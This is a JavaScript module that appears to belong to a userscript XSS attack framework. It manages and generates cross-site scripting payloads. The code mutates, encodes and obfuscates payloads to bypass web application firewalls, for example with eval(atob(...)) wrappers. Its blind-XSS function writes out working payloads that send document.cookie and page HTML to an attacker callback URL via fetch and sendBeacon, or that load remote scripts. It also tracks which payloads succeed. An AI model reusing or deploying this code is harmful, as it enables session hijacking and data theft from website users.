/**
 * @file payload-manager.js
 * @description Advanced payload management with dynamic generation
 * @version 8.0.0
 */

(function() {
    'use strict';

    class PayloadManager {
        constructor(framework) {
            this.framework = framework;
            this.payloads = new Map();
            this.categories = new Map();
            this.successfulPayloads = [];
            this.failedPayloads = [];
            this.customPayloads = [];
            
            this.initializeDefaultCategories();
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Initialize Default Categories
        // ═══════════════════════════════════════════════════════════════
        initializeDefaultCategories() {
            this.categories.set('basic', {
                name: 'Basic XSS',
                priority: 1,
                payloads: []
            });
            
            this.categories.set('advanced', {
                name: 'Advanced XSS',
                priority: 2,
                payloads: []
            });
            
            this.categories.set('waf-bypass', {
                name: 'WAF Bypass',
                priority: 3,
                payloads: []
            });
            
            this.categories.set('polyglot', {
                name: 'Polyglot',
                priority: 4,
                payloads: []
            });
            
            this.categories.set('mutation', {
                name: 'Mutation XSS',
                priority: 5,
                payloads: []
            });
            
            this.categories.set('blind', {
                name: 'Blind XSS',
                priority: 6,
                payloads: []
            });
        }

        // ═══════════════════════════════════════════════════════════════
        // 📦 Load Payloads
        // ═══════════════════════════════════════════════════════════════
        async loadPayloads(category) {
            if (this.categories.get(category)?.payloads.length > 0) {
                return this.categories.get(category).payloads;
            }

            // Lazy load payload module
            const payloadModule = await this.framework.loadModule('payloads', `${category}-payloads`);
            
            if (payloadModule && payloadModule.payloads) {
                const payloads = payloadModule.payloads;
                this.categories.get(category).payloads = payloads;
                
                payloads.forEach(payload => {
                    this.payloads.set(payload.id, payload);
                });

                return payloads;
            }

            return [];
        }

        // ═══════════════════════════════════════════════════════════════
        // 🎲 Generate Dynamic Payloads
        // ═══════════════════════════════════════════════════════════════
        async generatePayloads(context, options = {}) {
            const generatedPayloads = [];
            
            // Context-aware generation
            const contextType = context.type || 'html';
            const basePayloads = await this.getBasePayloadsForContext(contextType);

            for (const base of basePayloads) {
                // Apply mutations
                const mutations = this.applyMutations(base, options);
                generatedPayloads.push(...mutations);

                // Apply encoding
                if (options.encoding) {
                    const encoded = this.applyEncoding(base, options.encoding);
                    generatedPayloads.push(...encoded);
                }

                // Apply obfuscation
                if (options.obfuscation) {
                    const obfuscated = await this.applyObfuscation(base);
                    generatedPayloads.push(...obfuscated);
                }
            }

            // Add callback URL for blind XSS
            if (options.blindXSS && options.callbackUrl) {
                const blindPayloads = this.generateBlindPayloads(options.callbackUrl);
                generatedPayloads.push(...blindPayloads);
            }

            return generatedPayloads;
        }

        // ───────────────────────────────────────────────────────────────
        // 🧬 Apply Mutations
        // ───────────────────────────────────────────────────────────────
        applyMutations(payload, options) {
            const mutations = [];
            const mutationTechniques = [
                this.caseMutation,
                this.charMutation,
                this.spaceMutation,
                this.quoteMutation,
                this.tagMutation
            ];

            for (const technique of mutationTechniques) {
                if (!options.mutations || options.mutations.includes(technique.name)) {
                    const mutated = technique.call(this, payload);
                    mutations.push(...mutated);
                }
            }

            return mutations;
        }

        caseMutation(payload) {
            return [
                payload.toLowerCase(),
                payload.toUpperCase(),
                this.randomCase(payload)
            ];
        }

        charMutation(payload) {
            const mutations = [];
            
            // Replace characters with HTML entities
            mutations.push(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
            
            // Replace with Unicode
            mutations.push(this.toUnicode(payload));
            
            // Replace with hex
            mutations.push(this.toHex(payload));
            
            return mutations;
        }

        spaceMutation(payload) {
            return [
                payload.replace(/\s/g, ''),
                payload.replace(/\s/g, '/**/'),
                payload.replace(/\s/g, '%20'),
                payload.replace(/\s/g, '\t'),
                payload.replace(/\s/g, '\n')
            ];
        }

        quoteMutation(payload) {
            return [
                payload.replace(/"/g, "'"),
                payload.replace(/'/g, '"'),
                payload.replace(/["']/g, '`'),
                payload.replace(/"/g, '&quot;'),
                payload.replace(/'/g, '&#39;')
            ];
        }

        tagMutation(payload) {
            const mutations = [];
            
            // Add null bytes
            mutations.push(payload.replace(/<(\w+)/g, '<$1\x00'));
            
            // Add comments
            mutations.push(payload.replace(/<(\w+)/g, '<$1<!---->'));
            
            // Add attributes
            mutations.push(payload.replace(/<(\w+)/g, '<$1 x="y"'));
            
            return mutations;
        }

        // ───────────────────────────────────────────────────────────────
        // 🔐 Apply Encoding
        // ───────────────────────────────────────────────────────────────
        applyEncoding(payload, encodings) {
            const encoded = [];
            const techniques = {
                html: this.htmlEncode,
                url: this.urlEncode,
                base64: this.base64Encode,
                hex: this.hexEncode,
                unicode: this.unicodeEncode,
                double: this.doubleEncode
            };

            for (const [name, func] of Object.entries(techniques)) {
                if (!encodings || encodings.includes(name)) {
                    encoded.push(func.call(this, payload));
                }
            }

            return encoded;
        }

        htmlEncode(str) {
            return str.replace(/[&<>"']/g, m => ({
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#39;'
            })[m]);
        }

        urlEncode(str) {
            return encodeURIComponent(str);
        }

        base64Encode(str) {
            return btoa(str);
        }

        hexEncode(str) {
            return Array.from(str)
                .map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0'))
                .join('');
        }

        unicodeEncode(str) {
            return Array.from(str)
                .map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0'))
                .join('');
        }

        doubleEncode(str) {
            return this.urlEncode(this.urlEncode(str));
        }

        toUnicode(str) {
            return Array.from(str)
                .map(c => `&#${c.charCodeAt(0)};`)
                .join('');
        }

        toHex(str) {
            return Array.from(str)
                .map(c => `&#x${c.charCodeAt(0).toString(16)};`)
                .join('');
        }

        // ───────────────────────────────────────────────────────────────
        // 🎭 Apply Obfuscation
        // ───────────────────────────────────────────────────────────────
        async applyObfuscation(payload) {
            const obfuscationModule = await this.framework.loadModule('techniques', 'obfuscation');
            
            if (obfuscationModule) {
                return obfuscationModule.obfuscate(payload);
            }

            // Fallback basic obfuscation
            return [
                this.stringConcat(payload),
                this.charCodeObfuscation(payload),
                this.evalObfuscation(payload)
            ];
        }

        stringConcat(str) {
            return str.split('').map(c => `'${c}'`).join('+');
        }

        charCodeObfuscation(str) {
            const codes = Array.from(str).map(c => c.charCodeAt(0));
            return `String.fromCharCode(${codes.join(',')})`;
        }

        evalObfuscation(str) {
            return `eval(atob('${btoa(str)}'))`;
        }

        // ───────────────────────────────────────────────────────────────
        // 👁️ Generate Blind XSS Payloads
        // ───────────────────────────────────────────────────────────────
        generateBlindPayloads(callbackUrl) {
            return [
                `<script>fetch('${callbackUrl}?cookie='+document.cookie)</script>`,
                `<img src=x onerror="fetch('${callbackUrl}?data='+btoa(document.body.innerHTML))">`,
                `<script>navigator.sendBeacon('${callbackUrl}',JSON.stringify({url:location.href,cookie:document.cookie}))</script>`,
                `"><script src="${callbackUrl}/xss.js"></script>`,
                `<svg/onload="eval(atob(fetch('${callbackUrl}/payload').then(r=>r.text())))">`,
            ];
        }

        // ───────────────────────────────────────────────────────────────
        // 🎯 Context-Aware Payload Selection
        // ───────────────────────────────────────────────────────────────
        async getBasePayloadsForContext(contextType) {
            const contextMap = {
                html: ['basic', 'advanced'],
                javascript: ['advanced', 'polyglot'],
                css: ['advanced'],
                attribute: ['basic', 'advanced'],
                url: ['basic'],
                json: ['advanced', 'polyglot']
            };

            const categories = contextMap[contextType] || ['basic'];
            const payloads = [];

            for (const category of categories) {
                const categoryPayloads = await this.loadPayloads(category);
                payloads.push(...categoryPayloads);
            }

            return payloads;
        }

        // ───────────────────────────────────────────────────────────────
        // 📊 Payload Statistics
        // ───────────────────────────────────────────────────────────────
        recordSuccess(payload, context) {
            this.successfulPayloads.push({
                payload: payload,
                context: context,
                timestamp: Date.now()
            });

            this.framework.emit('payloadSuccess', { payload, context });
        }

        recordFailure(payload, context, reason) {
            this.failedPayloads.push({
                payload: payload,
                context: context,
                reason: reason,
                timestamp: Date.now()
            });
        }

        getStatistics() {
            return {
                total: this.payloads.size,
                successful: this.successfulPayloads.length,
                failed: this.failedPayloads.length,
                successRate: (this.successfulPayloads.length / 
                    (this.successfulPayloads.length + this.failedPayloads.length) * 100).toFixed(2) + '%',
                byCategory: this.getStatsByCategory()
            };
        }

        getStatsByCategory() {
            const stats = {};
            
            for (const [name, category] of this.categories) {
                stats[name] = {
                    total: category.payloads.length,
                    successful: this.successfulPayloads.filter(p => 
                        category.payloads.some(cp => cp.id === p.payload.id)
                    ).length
                };
            }

            return stats;
        }

        // ───────────────────────────────────────────────────────────────
        // 💾 Custom Payload Management
        // ───────────────────────────────────────────────────────────────
        addCustomPayload(payload, metadata = {}) {
            const customPayload = {
                id: `custom_${Date.now()}`,
                payload: payload,
                category: 'custom',
                metadata: metadata,
                added: Date.now()
            };

            this.customPayloads.push(customPayload);
            this.payloads.set(customPayload.id, customPayload);

            // Persist to storage
            this.saveCustomPayloads();

            return customPayload;
        }

        removeCustomPayload(id) {
            this.customPayloads = this.customPayloads.filter(p => p.id !== id);
            this.payloads.delete(id);
            this.saveCustomPayloads();
        }

        async saveCustomPayloads() {
            await GM_setValue('custom_payloads', JSON.stringify(this.customPayloads));
        }

        async loadCustomPayloads() {
            const saved = await GM_getValue('custom_payloads', '[]');
            try {
                this.customPayloads = JSON.parse(saved);
                this.customPayloads.forEach(p => this.payloads.set(p.id, p));
            } catch (e) {
                console.error('Failed to load custom payloads:', e);
            }
        }

        // ───────────────────────────────────────────────────────────────
        // 🔍 Payload Search & Filter
        // ───────────────────────────────────────────────────────────────
        searchPayloads(query, filters = {}) {
            let results = Array.from(this.payloads.values());

            // Text search
            if (query) {
                const lowerQuery = query.toLowerCase();
                results = results.filter(p => 
                    p.payload.toLowerCase().includes(lowerQuery) ||
                    p.metadata?.description?.toLowerCase().includes(lowerQuery)
                );
            }

            // Category filter
            if (filters.category) {
                results = results.filter(p => p.category === filters.category);
            }

            // Severity filter
            if (filters.severity) {
                results = results.filter(p => p.metadata?.severity === filters.severity);
            }

            // Success filter
            if (filters.successful) {
                const successfulIds = new Set(this.successfulPayloads.map(p => p.payload.id));
                results = results.filter(p => successfulIds.has(p.id));
            }

            return results;
        }

        // ───────────────────────────────────────────────────────────────
        // 📤 Export/Import
        // ───────────────────────────────────────────────────────────────
        exportPayloads(category = null) {
            let payloadsToExport;
            
            if (category) {
                payloadsToExport = this.categories.get(category)?.payloads || [];
            } else {
                payloadsToExport = Array.from(this.payloads.values());
            }

            return JSON.stringify({
                version: '8.0.0',
                exported: new Date().toISOString(),
                category: category,
                payloads: payloadsToExport
            }, null, 2);
        }

        importPayloads(jsonData) {
            try {
                const data = JSON.parse(jsonData);
                
                if (!data.payloads || !Array.isArray(data.payloads)) {
                    throw new Error('Invalid payload format');
                }

                let imported = 0;
                for (const payload of data.payloads) {
                    const id = `imported_${Date.now()}_${imported}`;
                    this.payloads.set(id, { ...payload, id, category: 'imported' });
                    imported++;
                }

                return { success: true, imported };
            } catch (error) {
                return { success: false, error: error.message };
            }
        }

        // ───────────────────────────────────────────────────────────────
        // 🛠️ Utility Methods
        // ───────────────────────────────────────────────────────────────
        randomCase(str) {
            return Array.from(str)
                .map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase())
                .join('');
        }

        getAllPayloads() {
            return Array.from(this.payloads.values());
        }

        getPayloadById(id) {
            return this.payloads.get(id);
        }

        getCategoryPayloads(category) {
            return this.categories.get(category)?.payloads || [];
        }
    }

    // Export
    exports.PayloadManager = PayloadManager;
    exports.create = (framework) => new PayloadManager(framework);
})();